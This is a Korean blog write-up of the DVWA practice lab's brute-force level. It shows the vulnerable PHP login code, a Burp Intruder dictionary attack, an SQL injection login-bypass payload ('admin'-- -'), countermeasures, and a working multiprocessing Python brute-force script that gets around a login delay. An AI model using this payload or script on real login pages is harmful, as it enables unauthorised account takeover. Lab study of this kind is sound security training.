---
title: Brute Force Write up
categories: 
 - 모의해킹
tag: 
 - DVWA
 - Brut Force
 - SQL Injection
 - burp suite
 - 브루트포스
 - 모의해킹
 - Grootsecurity
 - study
 - write up
---

# 개요
저의 첫 Write up인 Brute Force에서는 웹 취약점 공부를 할 수 있는 DVWA(Damn Vulnerable Web Application)을 활용하여 해킹이 진행됐으며, write up의 구성과 일부 내용은 Groot Security의 Brute Force wirte up을 예시를 참고하여 작성이 됐습니다.

> **해당 공격 기법들을 허가되지 않은 실제 운영 서버에서 시도하는 것은 정보통신망법에 어긋나는 행위입니다.**
{: .prompt-warning }

<br/>
## 목차
[1. **취약점 설명/공부** - 브루트포스 공격에 대한 연구](#1-취약점-설명)<br/>
[2. **개념증명 실습** - 브루트포스 공격에 대한 연구](#2-개념-증명)
<br/>
[3. **대응 방안 공부** - Burpsuite, Hydra 등의 툴을 이용한 브루트 포스 공격](#3-대응방안)
<br/>
[4. **툴 제작** - 자체 제작한 파이썬 툴을 이용한 브루트포스 공격](#4-툴-제작)
<br/>
[5. 레퍼런스](#레퍼런스)
<br/>
<br/>

## 취약점 정보

| 정보        | 설명                                             |
| ----------- | ------------------------------------------------ |
| **이름**    | 사용자 인증 브루트포스(Bruteforce)                |
| **심각도**  | 높은                                             |
| **CVSS**    | 8.1                                              |
| **CVSS String** | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H    |
| **위치**    | [http://localhost/vulnerabilities/brute/?username=admin&password=password&Login=Login](http://localhost/vulnerabilities/brute/?username=admin&password=password&Login=Login) |

<br/>
<br/>

## 1. 취약점 설명
---
### Brute Force란.
 Brute Force는 **자료구조의 Brut Force**와 **해킹에서의 Brute Force** 2가지의미로 사용이 된다. 그렇다고 해서 서로 완전히 다른 개념은 아니다. 자료구조에서는 문제를 해결하기위해 모든 경우의 수를 탐색하는 방식을 의미하고, 해킹에서는 비밀번호 크래킹 등에서 모든 가능한 조합을 시도하는 공격 방법을 말한다. 이 글에서는 해킹에서의 Brute Force를 다룰것이다.

앞서서 말했듯이 Brute Force는 암호 해독이나 인증 시스템을 침입하는 과정에서 사용되는 공격기법으로, 비밀번호 크래킹 등을 위해 가능한 조합들을 대입하여 접근을 시도하는 것을 말한다. 하지만 가능한 조합들이 **문자열의 길이, 대소문자의 여부, 특수문자의 여부, 자신이 가지고 있는 정보**에 따라 수도 없이 많아지기 때문에 시간복잡도면에서 정말 오랜 시간이 걸릴 수 있다는 단점과, 가능한 모든 경우의 수를 탐색하기위 해 많은 메모리가 필요될 수 있어 공간복잡도 측면에서도 이를 처리할 수 없는 상황이 발생할 수 있다.

이러한 단점들을 보완하기 위해 **사전 대입 공격, 스마트 브루트 포스, 병렬 브루트포스, 가속화된 Brut Force**가 있다. 여기서 사전 대입 공격은 aaaa, aaab, aaac, ··· 이런식으로 무차별적으로 대입하는것이 아닌 비밀번호로 예를 들면 해당 사용자의 이름, 자주쓰는 닉네임, 생년월일, 전화번호 등 특정한 정보들을 조합해 여러 문자열들을 만들어 대입하는 방식이다. 병렬 Brut Force는 여러 개의 처리 장치나 컴퓨터를 동시에 사용하여 Brut Force알고리즘을 병렬화하는 방식이다.

### DVWA취약점.
```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {   // Login 파라미터에 인자가 들어가면 True반환
    // Get username
    $user = $_GET[ 'username' ];    //

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );           // pass를 md5로 해싱

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";     // 쿼리 생성
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );    // db 쿼리 실행

    if( $result && mysqli_num_rows( $result ) == 1 ) {      // 명령어 실행 후 행의 수
        // Get users details
        $row    = mysqli_fetch_assoc( $result );    // 연관배열
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br/>Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
위 코드는 DVWA brut force low level의 php소스이다.
<br/>
소스를 보면 login을 하는데에 Brut Force에 대한 시큐어 코딩이 안돼있는것을 확인 할 수 있다. 따라서 Brut Force를 하기위해 Burp Suite에 Intuder기능을 사용해 공격을 진행해본 결과 1분 내에 관리자의 이름과 비밀번호를 알아냈다.

그리고 Brut Force이외에도 쿼리를 넣을 때 password에는 md5로 해쉬화 하지만 username에는 별 다른 필터링이 없이 그대로 넣어지는 것을 봐서 SQL Injection 또한 공격이 가능하다는 것을 확인 할 수 있다. 
<br/>
<br/>

## 2. 개념 증명
### Brut Force
개념 증명을 위해 해당 url에 Burpsuite의 내장되어 있는 Intruder기능을 사용해 공격을 시도 했고, 사용자의 username을 알고 있다고 가정을 하고 진행을 하겠다.

![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/1.png)

우선 HTTP요청을 잡기위해 입력란에 아무값이나 넣은 후 요청을 보낸 결과
![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/2.png)
위와같은 요청이 잡혔고, 로그인을 할 때 GET요청으로 username과 password, Login의 파라미터들이 있다는 것을 확인 했다. username이 admin이라는 것을 알고있으므로 username에는 admin을 넣어주었고, 위에 소스코드에서도 봤다시피 Login파라미터에 값이 없으면 동작을 하지 않으므로 아무런 값이나 집어 넣어줬다. 그리고 password부분에 Brut Force를 진행할 것이므로 아래와 같이 작업을 해주었다.

![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/3.png)
<br/>
<br/>

![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/4.png)

Payload의 type은 Simple list를 사용했고 사전 대입 문자열들로 12개 정도를 입력해주었고, 진짜 password인 password또한 추가해 주었다.

![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/5.png)
Attack결과로 위와같은 response의 결과값들이 나왔다. 여기서 Payload가 password이 외에 것들은 데이터 길이가 모두 4666으로 같은 값들이 나온것에 반해 password는 4704의 상대적으로 조금 큰 값이 나온것을 확인 할 수 있었고, password의 reponse를 보면 "Welcome to the password protected area admin"라는 문자열이 보이는 것으로 보아 로그인이 성공한 것을 알 수 있다.
<br/>
<br/>

### SQL Injection
해당 소스코드에서 Brut Force말고도 SQL Injection이 가능하다는 것도 확인 했었다. 

```php
 if( $result && mysqli_num_rows( $result ) == 1 ) {      // 명령어 실행 후 행의 수
        // Get users details
        $row    = mysqli_fetch_assoc( $result );    // 연관배열
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
```
전체 소스코드에서 if문 부분을 보면 $result 결과값이 있어야 하고 해당 결과값이 2가지 이상이 나온다면 거짓이되므로 username까지 알아내기에는 까다롭기에 username까지는 알고있다는 가정하에 진행을 하겠다.

```php
 $user = $_GET[ 'username' ];    //

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );           // pass를 md5로 해싱

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";     // 쿼리 생성
```
쿼리 를 생성하는 소스코드를 가져왔다. 해당 코드를 보면 처음 말했던 것처럼 password는 md5로 해쉬화하지만 username은 별다른 필터링을 하지 않고 바로 쿼리문에 집어 넣는 것을 확인할 수 있고, $user는 싱글쿼터(')안에 넣어 사용되고 있는것도 확인 할 수 있었다. 따라서 이 쿼리는 AND 로인해 user와 그 user의 해당하는 해쉬화된 pass값이 같아야지만 모든 행을 보여주는 소스이다. 결과적으로 username에 payload는 password와의 and로 묶여있는것을 풀어주기만 하면 로그인이 될 것이다.

![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/6.png)
```
username: admin'-- -
```
위와같은 방식으로 username은 admin으로 넣어주고 뒤에 password부분은 주석으로 날려보내면 로그인이 성공한 것을 알 수 있다.
<br/>
<br/>

**+추가**

brut force midium level에서는 
```php
if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
```
위의 코드와 같이 username은 mysqli_real_escape_string함수를 사용해 특수문자 필터링을 하고 password는 mysqli_real_excape_string과 더불어 md5의 암호화 까지 하고 있어 SQLInjection 에 대한 시큐어 코딩되어있다.

## 3. 대응방안
대응방안으로는 암호를 생성할 때 강력한 암호를 생성하기, 일정 횟수 이상의 로그인 실패시 계정을 일시적으로 제한을 하는것, CAPTHA, 2차인증, IP차단 등이 있다.

**CAPTCHA**는 현재 컴퓨터 사용자가 사람인지 로봇인지를 구분하기 위해 만들어진 기술이다. 따라서 사용하는 용도로는 흔히 계정을 생성하거나 게시물을 등록할 때 사람인지 봇인지 구분해 해킹을 방지하기 위해 사용되기도 하지만, AI를 학습시키기 위한 데이터로 활용되기도 한다.
CAPTCHA의 종류로는 **텍스트, 오디오, 이미지, 슬라이드 등**의 종류들이 있다.
![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/image_captcha.png)

**[텍스트 CAPTCHA]**
<br/>
<br/>

![image](https://Jimin0605.github.io/assets/img/Write_up/Brut_Force/image_captcha1.png)

**[이미지 CAPTCHA]**
<br/>
<br/>

그러나 이런 CAPTCHA와 같은 대응방안에 대해서는 한계점이 존재한다. 검증과정중 사람이 직접 개입을 해 해독을 하면 검증을 통과할수밖에 없고, 현재 기술이 발달하면서 텍스트CAPTCHA는 기계들도 충분히 판독이 가능해졌다. 반면에 특정한 장애가 있는 사람들이나 어린이, 노인 등의 접근을 방해하는 역효과 까지 일어난다.

**계정차단**은 한 계정에서 로그인 실패가 일정한 횟수 이상 일어날 시 계정을 일시적으로 잠그는 대응방안이다. **IP차단**도 마찬가지로 지속적인 로그인 실패가 일어날 시 IP가 차단이 되는 것이지만 차이점으로는 단순 계정차단은 하나의 계정에서 여러번의 실패가 일어나야지 계정이 차단하지만, IP차단의 경우는 다른 계정일 지라도 IP가 같을 경우 동일 IP에서 여러번의 실패가 발생되면 IP자체가 차단이 되는것이다.

이 외에도 가장 중요한 대응 방안은 애초에 **비밀번호를 설정할 때 적절한 길이, 영어 대소문자, 특수문자 사용, 자신의 정보를 담지 않은 예측 불가능한 문자열사용, 여러 사이트에 동일한 비밀번호 재활용 을 하지 않는것** 등이 brut force를 하는데에 큰 영향을 미친다.
## 4. 툴 제작
툴 제작은 level low단계에서는 brut force에 대한 시큐어 코딩이 되있지 않으므로 넘어가고 level medium에서의 시간 지연 대응에 대한 우회하는 코드 작성을 목표로 하겠다.
```php
if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
```
위 코드는 DVWA brut force medium level에서 login에 실패할 경우 sleep(2)를 넣어줌으로 써 로그인 요청에 대한 시간 지연을 발생시키는 코드이다.
<br/>
<br/>


[https://github.com/Jimin0605/DVWA_tools/blob/main/tools/BrutForce_ver_1.1.py](https://github.com/Jimin0605/DVWA_tools/blob/main/tools/BrutForce_ver_1.1.py)


**ver 1 code 중**

```python
url = "http://localhost/vulnerabilities/brute/"
cookie = "sqv78s0cmf06s3da5nqu4du4t"
level = "medium"
head = {"PHPSESSID":f"{cookie}", "security":f"{level}"}

def brut_force(passwordList):
    global url
    global head
    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param
        response = requests.get(payload, cookies=head)
        if "login_logo.png" in response.text:
            print("Connection failed..")
            break
        else:
            print("input password:", password)

        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password
    return None


## TEST 병렬처리O
if __name__ == '__main__':
    start = int(time.time())
    num_cores = 8
    pool = Pool(num_cores)
    filename = 'tools/passwordlist.txt'
    tasks = read_file(filename)
    results = pool.map(brut_force, tasks)
    end = int(time.time())

    for result in results:
        if result:
            print("password is:",result)
    print(f"걸린시간: {end-start}sec.")

```
처음 툴을 제작할 때 처음 완성이 됬던 github link에 있는 brut force ver 1을 실행을 했을 때 input password들이 약 2초간격으로 출력이 되는것을 확인 할 수 있다. 즉, medium난이도의 brut force에서 sleep(2)라는 http요청의 시간지연을 우회하기 위해 pyhton에서 제공하는 multiprocessing모듈에서 Pool을 이용해 병렬처리를 해주었지만 실패를 했다.

실패의 원인을 분석해보았을 때 함수를 실행할 때에는 병렬 처리가 잘 되었지만 요청을 보내는 부분에서 문제가 있던것이었다. requests.get으로 요청을 보낼 때 아무리 요청을 8개를 보내도 처음 받은 요청으로 인해 2초씩 시간지연이 발생하기 때문이다. 원래라면 요청 8개를 보냈을 때 서로 독립적으로 응답을 받고 2초씩 시간 지연이 생기는 방식으로 되어야 하는데 각 코어의 요청이 독립적으로 요청을 보내고 있지 않기에 이런 문제가 발생한 것이었다.

이것을 해결하기 위해 한개의 로그인상태가 아닌 각각의 세션들을 만들어 요청을 보내기위해 session_set이라는 함수를 만들어 로그인을 할 때 필요한 파라미터인 username과 password, Login은 각각 admin, password, Login으로 입력해주고 user_token은 BeautifulSoup을 이용해 token을 가져와 입력을 하게 해주었다. 그리고 login폼에 post요청으로 login_info와 함께 요청을 보내주면 새로운 세션이 만들어진다. brut force 함수를 실행 할 때 8개의 코어로 나누어 실행하므로써 각각의 새로운 세션이 만들어지고 이를통해 서로 독립적으로 요청이 보내져 한번에 8개의 password값을 입력할 수 있게 되는것이다.

**ver 1.1 code**
```python
'''
brut force 병렬처리 성공
'''

from multiprocessing import Pool
import requests
import bs4

'''
파일을 불러와 tasks라는 변수에 리스트 형식으로 반환

@param 문자열 리스트가 있는 파일위치
@return 문자열 리스트
'''
def read_file(filename):
    tasks = []
    with open(filename, 'r') as file:
        for line in file:
            tasks.append([line.strip()])  # 각 문자열을 리스트로 감싸서 추가
    return tasks


'''
username, password, Login의 값과 Beautifulsoup을 이용해 찾아낸 user_toke으로
새로운 session 찾기

@return Session 객체
'''
def session_set():
    with requests.Session() as s:
        url = "http://localhost/login.php"
        login_info = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            }

        user_token = bs4.BeautifulSoup(s.get(url).text, 'html.parser').select('input[name="user_token"]')[0]['value']
        login_info['user_token'] = user_token       # create user_token

        s.post(url, data=login_info)

        return s


'''
medium level의 brut force메뉴 에서 username: admin인 상태로 password brut force진행
get요청을 보낸 후 응답코드 200과 response.text값 안에 'Welcome to the password protected area'라는 문자열이 있을경우
현 password 반환

@param 문자열 리스트
@return 로그인이 성공한 password
'''
def brut_force(passwordList):
    s = session_set()
    url = "http://localhost/vulnerabilities/brute/"
    level = "medium"
    head = {"PHPSESSID": s.cookies['PHPSESSID'], "security": level}

    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param
        print("input password:",password)
        response = requests.get(payload, cookies=head)
        # print(response.cookies)
        # print(response.text)
        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password
        


if __name__ == '__main__':
    num_cores = 8
    pool = Pool(num_cores)
    filename = 'tools/passwordlist.txt'
    tasks = read_file(filename)
    results = pool.map(brut_force, tasks)

    for result in results:
        if result:
            print("\n\nBruteforce SUCCESS!!")
            print("password is", result)
```



## 레퍼런스
- **grootsecurity** - DVWA 브루트포스에 대한 writeup 예시:
[https://security.grootboan.com/follow-along/undefined/0-dvwa/reference-writeup](https://security.grootboan.com/follow-along/undefined/0-dvwa/reference-writeup)
- Seung Jae Lee - Brute Force Attack Countermeasures (무차별 공격 대응방안): [https://koreanblacklee.github.io/posts/database/bruteforce](https://koreanblacklee.github.io/posts/database/bruteforce)